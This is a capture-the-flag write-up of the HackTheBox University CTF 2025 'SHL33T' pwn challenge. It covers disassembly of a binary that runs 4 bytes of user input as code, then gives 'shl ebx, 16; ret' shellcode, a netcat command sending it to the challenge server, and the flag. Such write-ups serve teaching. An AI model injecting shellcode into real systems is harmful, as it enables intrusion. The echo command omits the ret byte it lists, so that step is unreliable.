---
title: University CTF 2025 - Tinsel Trouble
published: 2025-12-20
cover: "./img/unilogo.jpg"
description: Writeup of challenges from HackTheBox University CTF 2025.
image: "./img/unilogo.jpg"
tags: [CTF, Pwn, Shellcode, BinaryExploitation]
category: Writeups
draft: false
---
## Overview
- **Challenge Name:** `SHL33T`<br>
- **Category:** PWN<br>
- **Difficulty:** very easy
---

## Description

The mischievous elves have tampered with Nibbletop’s registers most notably the EBX register and now he’s stuck, unable to continue delivering Christmas gifts. Can you step in, restore his register, and save Christmas once again for everyone?

---
## Initial Analysis

The challenge provides a vulnerable binary `shl33t` where the EBX register has been modified incorrectly.

```sh frame="none" ShowLineNumbers=false
$ file shl33t
shl33t: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d6bd527d1e1ffe23cd8cde17a97cf771c50738e7, for GNU/Linux 3.2.0, not stripped
```

- **64-bit ELF:** We're dealing with x86-64 architecture.
- **PIE executable:** Addresses are randomized.
- **Dynamically linked:** Uses shared libraries.
- **Not stripped:** Debug symbols are present.

```
┌──(duo㉿xDU0)-[~]
└─$ nc 154.57.164.67 30831

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣠⣤⣤⣤⣤⣤⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⠟⠛⠋⠉⠉⠉⠉⠉⠉⠉⠉⠙⠛⠳⢶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠏⠀⠀⠀⠀⠀⢾⣦⣄⣀⡀⣀⣠⣤⡶⠟⠀⠀⠀⠀⠀⠀⠈⠻⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣴⡿⠃⠀⣶⠶⠶⠶⠶⣶⣬⣉⠉⠉⠉⢉⣡⣴⡶⠞⠛⠛⠷⢶⡆⠀⠀⠈⢿⠶⠖⠚⠛⠷⠶⢶⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣠⣴⡾⠛⠋⠉⡉⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⡀⠉⠙⠛⠛⠛⠛⠉⠀⠀⢀⣤⣭⣤⣀⠀⠀⠀⠀⠈⠀⠀⢀⣴⣶⣶⣦⣤⣌⡉⠛⢷⣦⣄⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣶⠟⠋⣀⣤⣶⠾⠿⣶⡀⠀⠀⠀⣴⡟⢋⣿⣤⡉⠻⣦⠀⠀⠀⠀⠀⠀⢀⣾⠟⢩⣿⣉⠛⣷⣄⠀⠀⠀⠀⢰⡿⠑⠀⠀⠀⠈⠉⠛⠻⣦⣌⠙⢿⣦⠀⠀⠀⠀
⠀⣴⡟⠁⣰⡾⠛⠉⠀⠀⠀⢻⣇⡀⠀⢸⣿⠀⣿⠋⠉⣿⠀⢻⡆⠀⠀⠀⠀⠀⣾⡇⢰⡟⠉⢻⣧⠘⣿⠀⠀⠀⠀⣼⠇⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⡇⠀⠙⢷⣆⠀
⢰⡟⠀⢼⡏⠀⠀⠀⠀⠀⠀⠈⠛⠛⠀⠈⢿⣆⠙⠷⠾⠛⣠⣿⠁⠀⠀⠀⠀⠀⠹⣧⡈⠿⣶⠾⠋⣼⡟⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠶⠶⣶⣤⣌⡻⣧⡀
⢸⣧⣯⣬⣥⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⢶⡶⠾⠛⠁⠀⠀⠀⠀⠀⠀⠀⠙⠻⢶⣶⣶⠿⠋⠀⠀⠀⠰⣼⡏⠀⠀⠀⠀⠀⠀⢠⣾⠏⠀⠀⠀⠀⠈⠉⠛⠛⠃
⠀⠀⠀⠈⠉⠉⠉⠛⠿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⣲⣖⣠⣶⣶⣶⠀⠀⠀⠀⣀⣤⣤⡂⡀⠀⠀⠀⠀⠀⠀⠀⢸⠟⠀⠀⠀⠀⠀⢀⣴⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣄⠀⠀⠀⠀⢠⣾⠋⠁⢿⣇⠀⠀⠀⠀⠀⠀⢙⠉⣹⡇⠻⠷⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣤⣀⡀⠘⠟⠃⠀⠈⢙⣷⡄⠀⠀⠀⣠⣶⠿⠋⠁⠀⠀⠀⠙⣿⠀⠀⢠⣤⣤⣶⠶⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⣿⡄⠀⠀⠀⠀⠀⢸⣿⠀⠀⢰⡿⠁⠀⠀⠀⠀⠀⠀⣠⡿⠀⢠⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣄⠀⠀⠀⠀⠀⢻⣧⣠⡿⠁⠀⠀⠀⠀⠀⠀⠀⠉⠁⣴⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣆⠀⢿⣦⡀⠀⠉⠉⠀⠀⠀⠀⠀⣀⣄⠀⠀⢠⣾⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣧⡀⠙⠻⢷⣦⣄⣀⣤⣤⣶⠾⠛⠁⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣄⡀⠀⠀⠀⠀⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⠷⠶⠶⠾⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


[Nibbletop] These elves are playing with me again, look at this mess: ebx = 0x00001337

[Nibbletop] It should be ebx = 0x13370000 instead!

[Nibbletop] Please fix it kind human! SHLeet the registers!

$ nnn

[Nibbletop] ARE YOU MOCKING ME WITH THE ELVES?!
```
---
### From the decompiled code, the key points are:

The challenge name `shl33t` gives us our first clue:

SHL refers to the x86 assembly `Shift Left` instruction

We need to `shift left` the value 1337

The initial value of EBX is:

```
0x00001337
```

The expected value is:

```
0x13370000
```

This transformation can be achieved by shifting the register left by 16 bits:

```
0x00001337 << 16 = 0x13370000
```

---

## Disassembly Analysis

Let's examine the key parts of the disassembled main function:

```bash
──(duo㉿xDU0)-[]
└─$ objdump -d shl33t | grep -A 50 "<main>:"
0000000000001988 <main>:
    1988:       f3 0f 1e fa             endbr64
    198c:       55                      push   %rbp
    198d:       48 89 e5                mov    %rsp,%rbp
    1990:       53                      push   %rbx
    1991:       48 83 ec 38             sub    $0x38,%rsp
    1995:       64 48 8b 04 25 28 00    mov    %fs:0x28,%rax
    199c:       00 00
    199e:       48 89 45 e8             mov    %rax,-0x18(%rbp)
    19a2:       31 c0                   xor    %eax,%eax
    19a4:       e8 53 ff ff ff          call   18fc <banner>
    19a9:       48 8d 05 9c ff ff ff    lea    -0x64(%rip),%rax        # 194c <handler>
    19b0:       48 89 c6                mov    %rax,%rsi
    19b3:       bf 0b 00 00 00          mov    $0xb,%edi
    19b8:       e8 33 f8 ff ff          call   11f0 <signal@plt>
    19bd:       48 8d 05 88 ff ff ff    lea    -0x78(%rip),%rax        # 194c <handler>
    19c4:       48 89 c6                mov    %rax,%rsi
    19c7:       bf 04 00 00 00          mov    $0x4,%edi
    19cc:       e8 1f f8 ff ff          call   11f0 <signal@plt>
    19d1:       bb 37 13 00 00          mov    $0x1337,%ebx
    19d6:       48 8d 05 7b 14 00 00    lea    0x147b(%rip),%rax        # 2e58 <_IO_stdin_used+0xe58>
    19dd:       48 89 c7                mov    %rax,%rdi
    19e0:       b8 00 00 00 00          mov    $0x0,%eax
    19e5:       e8 d8 f9 ff ff          call   13c2 <info>
    19ea:       48 8d 05 b7 14 00 00    lea    0x14b7(%rip),%rax        # 2ea8 <_IO_stdin_used+0xea8>
    19f1:       48 89 c7                mov    %rax,%rdi
    19f4:       b8 00 00 00 00          mov    $0x0,%eax
    19f9:       e8 c4 f9 ff ff          call   13c2 <info>
    19fe:       48 8d 05 cb 14 00 00    lea    0x14cb(%rip),%rax        # 2ed0 <_IO_stdin_used+0xed0>
    1a05:       48 89 c7                mov    %rax,%rdi
    1a08:       b8 00 00 00 00          mov    $0x0,%eax
    1a0d:       e8 b0 f9 ff ff          call   13c2 <info>
    1a12:       41 b9 00 00 00 00       mov    $0x0,%r9d
    1a18:       41 b8 ff ff ff ff       mov    $0xffffffff,%r8d
    1a1e:       b9 22 00 00 00          mov    $0x22,%ecx
    1a23:       ba 07 00 00 00          mov    $0x7,%edx
    1a28:       be 00 10 00 00          mov    $0x1000,%esi
    1a2d:       bf 00 00 00 00          mov    $0x0,%edi
    1a32:       e8 69 f7 ff ff          call   11a0 <mmap@plt>
    1a37:       48 89 45 d0             mov    %rax,-0x30(%rbp)
    1a3b:       48 83 7d d0 ff          cmpq   $0xffffffffffffffff,-0x30(%rbp)
    1a40:       75 19                   jne    1a5b <main+0xd3>
    1a42:       48 8d 05 bb 14 00 00    lea    0x14bb(%rip),%rax        # 2f04 <_IO_stdin_used+0xf04>
    1a49:       48 89 c7                mov    %rax,%rdi
    1a4c:       e8 cf f7 ff ff          call   1220 <perror@plt>
    1a51:       bf 01 00 00 00          mov    $0x1,%edi
    1a56:       e8 e5 f7 ff ff          call   1240 <exit@plt>
    1a5b:       48 8b 45 d0             mov    -0x30(%rbp),%rax
    1a5f:       ba 04 00 00 00          mov    $0x4,%edx
    1a64:       48 89 c6                mov    %rax,%rsi
    1a67:       bf 00 00 00 00          mov    $0x0,%edi
```

The main function performs the following actions:

- Initializes EBX with the value `0x1337`
- Allocates RWX memory using `mmap`
- Reads 4 bytes of user input
- Executes the input as shellcode

---

## Vulnerability

The program is vulnerable due to:

- RWX memory allocation
- User-controlled input
- Direct execution without validation

---

## Exploitation

No need to dig deeper, all we gotta do is change the value for the register `ebx` from `0x00001337` to `0x13370000` using shellcode.<br>
My first instinct was something like this:
```asm
mov ebx, 0x13370000
```

But then i realized that the input size is only 4 bytes, instead we can just shift the value by 16 bits to the left and then return.
```asm
shl ebx, 16
ret
```

---

## Shellcode

Machine code:

```
C1 E3 10 C3```

---

## Exploitation

```bash
echo -ne "\xC1\xE3\x10" | nc 154.57.164.67 30831
```

---

## Flag

```
CTF{sh1ft_l3ft_1337_r3g1st3r}
```
![alt text](./img/skibidi.png)
---

